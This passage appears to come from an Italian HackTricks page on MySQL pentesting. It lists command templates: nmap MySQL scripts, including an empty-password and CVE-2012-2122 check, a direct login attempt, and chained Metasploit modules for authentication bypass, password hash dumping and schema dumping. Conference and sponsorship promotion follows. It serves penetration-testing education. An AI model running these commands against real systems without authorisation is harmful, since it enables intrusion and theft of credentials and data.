Entry_2:
Name: Nmap
Description: Nmap with MySql Scripts
Command: nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse {IP} -p 3306

Entry_3:
Name: MySql
Description: Attempt to connect to mysql server
Command: mysql -h {IP} -u {Username}@localhost

Entry_4:
Name: MySql consolesless mfs enumeration
Description: MySql enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_version; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_authbypass_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/admin/mysql/mysql_enum; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_hashdump; set RHOSTS {IP}; set RPORT 3306; run; exit' && msfconsole -q -x 'use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS {IP}; set RPORT 3306; run; exit'

```

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) √® l'evento sulla sicurezza informatica pi√π rilevante in **Spagna** e uno dei pi√π importanti in **Europa**. Con **la missione di promuovere la conoscenza tecnica**, questo congresso √® un punto di incontro vivace per i professionisti della tecnologia e della sicurezza informatica in ogni disciplina.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF**, controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT**](https://opensea.io/collection/the-peass-family) esclusivi
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository GitHub di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
